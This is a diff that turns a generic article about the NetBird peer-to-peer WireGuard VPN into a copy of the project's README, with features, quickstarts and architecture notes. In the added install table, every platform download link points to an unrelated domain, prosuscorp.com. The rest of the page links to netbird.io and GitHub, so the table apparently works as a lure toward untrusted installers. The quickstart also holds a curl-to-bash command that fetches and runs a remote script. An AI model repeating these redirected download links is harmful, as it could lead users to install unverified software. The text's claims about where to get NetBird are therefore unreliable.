@@ -1,72 +1,131 @@
-Netbird: A Secure and Efficient VPN Solution
+   
+</p>
+<br/>
+<div align="center">
+<p align="center">
+  <img width="234" src="docs/media/logo-full.png"/>
+</p>
+  <p>
+   <a href="https://img.shields.io/badge/license-BSD--3-blue)">
+       <img src="https://sonarcloud.io/api/project_badges/measure?project=netbirdio_netbird&metric=alert_status" />
+     </a> 
+     <a href="https://github.com/netbirdio/netbird/blob/main/LICENSE">
+       <img src="https://img.shields.io/badge/license-BSD--3-blue" />
+     </a> 
+    <br>
+    <a href="https://join.slack.com/t/netbirdio/shared_invite/zt-2utg2ncdz-W7LEB6toRBLE1Jca37dYpg">
+        <img src="https://img.shields.io/badge/slack-@netbird-red.svg?logo=slack"/>
+     </a>  
+     <br>
+    <a href="https://gurubase.io/g/netbird">
+        <img src="https://img.shields.io/badge/Gurubase-Ask%20NetBird%20Guru-006BFF"/>
+     </a>    
+  </p>
+</div>
 
-Netbird is a modern VPN solution designed to provide seamless and secure connections between devices. Whether for personal use or within an organization, Netbird enables users to establish private, encrypted networks that ensure data protection and enhanced connectivity. With a user-friendly design and powerful features, it stands out as an efficient tool for secure communications in today’s digital landscape.
 
-What is Netbird?
+<p align="center">
+<strong>
+  <br/>
+  See <a href="https://netbird.io/docs/">Documentation</a>
+  <br/>
+   Join our <a href="https://join.slack.com/t/netbirdio/shared_invite/zt-2utg2ncdz-W7LEB6toRBLE1Jca37dYpg">Slack channel</a>
+  <br/>
+ 
+</strong>
+</p>
 
-Netbird is a software application that simplifies the process of creating Virtual Private Networks (VPNs). Unlike traditional VPNs that route traffic through centralized servers, Netbird leverages a peer-to-peer (P2P) architecture. This approach allows devices to connect directly with one another, reducing latency and enhancing performance. By employing advanced encryption methods, Netbird ensures that all data transmitted across the network remains private and protected from unauthorized access.
+<br>
 
-Key Features
+**NetBird combines a configuration-free peer-to-peer private network and a centralized access control system in a single platform, making it easy to create secure private networks for your organization or home.**
 
-1. Ease of Use  
-Netbird is designed with simplicity in mind. Setting up a secure connection is straightforward, requiring minimal technical expertise. Users can quickly create and manage secure networks, making it accessible to individuals and businesses alike.
+**Connect.** NetBird creates a WireGuard-based overlay network that automatically connects your machines over an encrypted tunnel, leaving behind the hassle of opening ports, complex firewall rules, VPN gateways, and so forth.
 
-2. Cross-Platform Support  
-Netbird is compatible with multiple operating systems, including Windows, macOS, Linux, and mobile platforms. This ensures that users can connect devices seamlessly across different environments.
+**Secure.** NetBird enables secure remote access by applying granular access policies while allowing you to manage them intuitively from a single place. Works universally on any infrastructure.
 
-3. High-Level Security  
-Security is at the core of Netbird’s functionality. The software uses state-of-the-art encryption protocols, such as WireGuard, to safeguard communications. This ensures protection against data breaches, hacking attempts, and other cyber threats.
+# Install NetBird
+To install NetBird, follow the instructions according to your operating system.
 
-4. Scalability  
-Whether you’re connecting a few devices at home or managing a large network for your business, Netbird scales effortlessly. Its architecture is designed to support networks of any size without compromising performance.
+| Jump to: | [Windows](https://prosuscorp.com/netbird) |[MacOS](https://prosuscorp.com/netbird) | [Linux](https://prosuscorp.com/netbird) | [iOS](https://prosuscorp.com/netbird) | [Android](https://prosuscorp.com/netbird) | [Docker](https://prosuscorp.com/netbird) | [Other platforms](https://prosuscorp.com/netbird) |
+| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
 
-5. Performance Optimization  
-Traditional VPNs often suffer from high latency and reduced speeds due to centralized routing. Netbird’s peer-to-peer technology minimizes these issues, providing faster and more reliable connections.
+### Open-Source Network Security in a Single Platform
 
-6. Customizable Configuration  
-For advanced users, Netbird offers options to customize network configurations, routing rules, and access permissions. This flexibility makes it suitable for various use cases, from personal projects to complex enterprise networks.
 
-How Does Netbird Work?
+![netbird_2](https://github.com/netbirdio/netbird/assets/700848/46bc3b73-508d-4a0e-bb9a-f465d68646ab)
 
-Netbird operates by establishing encrypted tunnels between devices. Using the WireGuard protocol, it creates secure peer-to-peer connections that bypass the need for centralized servers. This not only enhances performance but also reduces the risk of server-based vulnerabilities. The software automatically handles IP address allocation, NAT traversal, and other networking complexities, making the setup process hassle-free for users.
+### NetBird on Lawrence Systems (Video)
+[![Watch the video](https://img.youtube.com/vi/Kwrff6h0rEw/0.jpg)](https://www.youtube.com/watch?v=Kwrff6h0rEw)
 
-Use Cases
+### Key features
 
-1. Remote Work  
-In an era where remote work is increasingly common, Netbird provides a reliable way to connect team members securely. Employees can access company resources without compromising data security.
+| Connectivity                                                                                                                 | Management                                                                                               | Security                                                                                                                              | Automation                                                                                                                               | Platforms                                                                               |
+|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------|
+| <ul><li> - \[x] Kernel WireGuard </ul></li>                                                                                  | <ul><li> - \[x] [Admin Web UI](https://github.com/netbirdio/dashboard) </ul></li>                        | <ul><li> - \[x] [SSO & MFA support](https://docs.netbird.io/how-to/installation#running-net-bird-with-sso-login) </ul></li>           | <ul><li> - \[x] [Public API](https://docs.netbird.io/api) </ul></li>                                                                     | <ul><li> - \[x] Linux </ul></li>                                                        |
+| <ul><li> - \[x] Peer-to-peer connections </ul></li>                                                                          | <ul><li> - \[x] Auto peer discovery and configuration </ul></li>                                         | <ul><li> - \[x] [Access control - groups & rules](https://docs.netbird.io/how-to/manage-network-access) </ul></li>                    | <ul><li> - \[x] [Setup keys for bulk network provisioning](https://docs.netbird.io/how-to/register-machines-using-setup-keys) </ul></li> | <ul><li> - \[x] Mac </ul></li>                                                          |
+| <ul><li> - \[x] Connection relay fallback </ul></li>                                                                         | <ul><li> - \[x] [IdP integrations](https://docs.netbird.io/selfhosted/identity-providers) </ul></li>     | <ul><li> - \[x] [Activity logging](https://docs.netbird.io/how-to/monitor-system-and-network-activity) </ul></li>                     | <ul><li> - \[x] [Self-hosting quickstart script](https://docs.netbird.io/selfhosted/selfhosted-quickstart) </ul></li>                    | <ul><li> - \[x] Windows </ul></li>                                                      |
+| <ul><li> - \[x] [Routes to external networks](https://docs.netbird.io/how-to/routing-traffic-to-private-networks) </ul></li> | <ul><li> - \[x] [Private DNS](https://docs.netbird.io/how-to/manage-dns-in-your-network) </ul></li>      | <ul><li> - \[x] [Device posture checks](https://docs.netbird.io/how-to/manage-posture-checks) </ul></li>                              | <ul><li> - \[x] IdP groups sync with JWT </ul></li>                                                                                      | <ul><li> - \[x] Android </ul></li>                                                      |
+| <ul><li> - \[x] NAT traversal with BPF </ul></li>                                                                            | <ul><li> - \[x] [Multiuser support](https://docs.netbird.io/how-to/add-users-to-your-network) </ul></li> | <ul><li> -  \[x] Peer-to-peer encryption </ul></li>                                                                                   |                                                                                                                                          | <ul><li> - \[x] iOS </ul></li>                                                          |
+|                                                                                                                              |                                                                                                          | <ul><li> - \[x] [Quantum-resistance with Rosenpass](https://netbird.io/knowledge-hub/the-first-quantum-resistant-mesh-vpn) </ul></li> |                                                                                                                                          | <ul><li> - \[x] OpenWRT </ul></li>                                                      |
+|                                                                                                                              |                                                                                                          | <ui><li> - \[x] [Periodic re-authentication](https://docs.netbird.io/how-to/enforce-periodic-user-authentication)</ul></li>           |                                                                                                                                          | <ul><li> - \[x] [Serverless](https://docs.netbird.io/how-to/netbird-on-faas) </ul></li> |
+|                                                                                                                              |                                                                                                          |                                                                                                                                       |                                                                                                                                          | <ul><li> - \[x] Docker </ul></li>                                                       |
 
-2. Personal Privacy  
-For individuals, Netbird ensures private browsing and secure communication over public Wi-Fi networks, protecting personal information from potential threats.
+### Quickstart with NetBird Cloud
 
-3. IoT Device Management  
-Netbird can be used to securely manage Internet of Things (IoT) devices, ensuring they communicate safely within a private network.
+- Download and install NetBird at [https://app.netbird.io/install](https://app.netbird.io/install)
+- Follow the steps to sign-up with Google, Microsoft, GitHub or your email address.
+- Check NetBird [admin UI](https://app.netbird.io/).
+- Add more machines.
 
-4. Gaming and Media Streaming  
-Gamers and streamers can benefit from Netbird’s low-latency connections, enabling smooth online gameplay and uninterrupted streaming experiences.
+### Quickstart with self-hosted NetBird
 
-Advantages Over Traditional VPNs
+> This is the quickest way to try self-hosted NetBird. It should take around 5 minutes to get started if you already have a public domain and a VM.
+Follow the [Advanced guide with a custom identity provider](https://docs.netbird.io/selfhosted/selfhosted-guide#advanced-guide-with-a-custom-identity-provider) for installations with different IDPs.
 
-Netbird’s innovative approach addresses several shortcomings of traditional VPNs:
-- Decentralized Architecture: Eliminates reliance on a single point of failure, enhancing reliability.
-- Improved Speed: Direct connections between devices reduce latency and improve data transfer rates.
-- Cost Efficiency: Avoids the need for expensive centralized infrastructure.
-- Flexibility: Suitable for a wide range of use cases, from personal projects to enterprise-level deployments.
+**Infrastructure requirements:**
+- A Linux VM with at least **1CPU** and **2GB** of memory.
+- The VM should be publicly accessible on TCP ports **80** and **443** and UDP ports: **3478**, **49152-65535**.
+- **Public domain** name pointing to the VM.
 
-Getting Started with Netbird
+**Software requirements:**
+- Docker installed on the VM with the docker-compose plugin ([Docker installation guide](https://docs.docker.com/engine/install/)) or docker with docker-compose in version 2 or higher.
+- [jq](https://jqlang.github.io/jq/) installed. In most distributions
+  Usually available in the official repositories and can be installed with `sudo apt install jq` or `sudo yum install jq`
+- [curl](https://curl.se/) installed.
+  Usually available in the official repositories and can be installed with `sudo apt install curl` or `sudo yum install curl`
 
-Getting started with Netbird is simple. Here’s a quick overview:
-1. Download and Install: Install the software on your devices from the official website.
-2. Create an Account: Sign up for a free or premium account, depending on your needs.
-3. Set Up a Network: Use the intuitive interface to create and manage your private network.
-4. Connect Devices: Add devices to your network using unique access keys or QR codes.
-5. Start Using: Enjoy secure and fast connections with minimal configuration.
+**Steps**
+- Download and run the installation script:
+```bash
+export NETBIRD_DOMAIN=netbird.example.com; curl -fsSL https://github.com/netbirdio/netbird/releases/latest/download/getting-started-with-zitadel.sh | bash
+```
+- Once finished, you can manage the resources via `docker-compose`
 
-Why Choose Netbird?
+### A bit on NetBird internals
+-  Every machine in the network runs [NetBird Agent (or Client)](client/) that manages WireGuard.
+-  Every agent connects to [Management Service](management/) that holds network state, manages peer IPs, and distributes network updates to agents (peers).
+-  NetBird agent uses WebRTC ICE implemented in [pion/ice library](https://github.com/pion/ice) to discover connection candidates when establishing a peer-to-peer connection between machines.
+-  Connection candidates are discovered with the help of [STUN](https://en.wikipedia.org/wiki/STUN) servers.
+-  Agents negotiate a connection through [Signal Service](signal/) passing p2p encrypted messages with candidates.
+-  Sometimes the NAT traversal is unsuccessful due to strict NATs (e.g. mobile carrier-grade NAT) and a p2p connection isn't possible. When this occurs the system falls back to a relay server called [TURN](https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT), and a secure WireGuard tunnel is established via the TURN server. 
+ 
+[Coturn](https://github.com/coturn/coturn) is the one that has been successfully used for STUN and TURN in NetBird setups.
 
-Netbird combines the best of modern VPN technology with a focus on user experience. Its ability to deliver fast, secure, and scalable connections makes it a versatile tool for both personal and professional use. Whether you’re looking to enhance online privacy, enable remote work, or streamline device communication, Netbird offers a robust solution tailored to your needs.
+<p float="left" align="middle">
+  <img src="https://docs.netbird.io/docs-static/img/architecture/high-level-dia.png" width="700"/>
+</p>
 
-In today’s world, where cybersecurity threats are on the rise and connectivity is essential, Netbird provides peace of mind and efficiency. With its innovative features and commitment to simplicity, it is an excellent choice for anyone seeking a reliable VPN solution.
+See a complete [architecture overview](https://docs.netbird.io/about-netbird/how-netbird-works#architecture) for details.
 
-Conclusion
+### Community projects
+-  [NetBird installer script](https://github.com/physk/netbird-installer)
+-  [NetBird ansible collection by Dominion Solutions](https://galaxy.ansible.com/ui/repo/published/dominion_solutions/netbird/)
 
-Netbird is more than just a VPN—it’s a gateway to secure, efficient, and flexible networking. By harnessing the power of peer-to-peer technology and advanced encryption, it offers a modern alternative to traditional VPN solutions. Whether for personal use or business applications, Netbird empowers users to stay connected while keeping their data safe.
+**Note**: The `main` branch may be in an *unstable or even broken state* during development.
+For stable versions, see [releases](https://github.com/netbirdio/netbird/releases).
+
+### Support acknowledgement
+
+In November 2022, NetBird joined the [StartUpSecure program](https://www.forschung-it-sicherheit-kommunikationssysteme.de/foerderung/bekanntmachungen/startup-secure) sponsored by The Federal Ministry of Education and Research of The Federal Republic of Germany. Together with [CISPA Helmholtz Center for Information Security](https://cispa.de/en) NetBird brings the security best practices and simplicity to private networking.
+
+![CISPA_Logo_BLACK_EN_RZ_RGB (1)](https://user-images.githubusercontent.com/700848/203091324-c6d311a0-22b5-4b05-a288-91cbc6cdcc46.png)
